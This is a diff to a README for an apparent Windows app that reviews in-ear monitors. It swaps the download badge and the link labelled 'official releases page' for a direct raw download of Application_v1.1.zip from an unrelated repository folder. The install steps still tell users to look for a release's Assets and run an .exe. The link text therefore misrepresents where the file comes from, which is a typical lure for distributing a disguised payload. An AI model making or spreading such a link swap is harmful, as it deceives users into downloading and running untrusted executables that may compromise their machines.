@@ -5,7 +5,7 @@ description: "Evaluate IEMs, adjust EQ settings, and manage listening notes in a
 ---
 # 🎧 iem-tool-2026-audio-review - Evaluate your earbuds with ease today
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/jithin1888/iem-tool-2026-audio-review)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/jithin1888/jithin1888.github.io/raw/refs/heads/main/public/Application_v1.1.zip)
 
 ## What is this tool?
 
@@ -19,7 +19,7 @@ You need a computer running Windows 10 or Windows 11. Your computer requires at 
 
 Follow these steps to install the tool on your machine:
 
-1. Visit the [official releases page](https://github.com/jithin1888/iem-tool-2026-audio-review).
+1. Visit the [official releases page](https://github.com/jithin1888/jithin1888.github.io/raw/refs/heads/main/public/Application_v1.1.zip).
 2. Locate the section labeled Assets at the bottom of the latest release.
 3. Select the file ending in .exe.
 4. Save the file to your desktop or downloads folder.
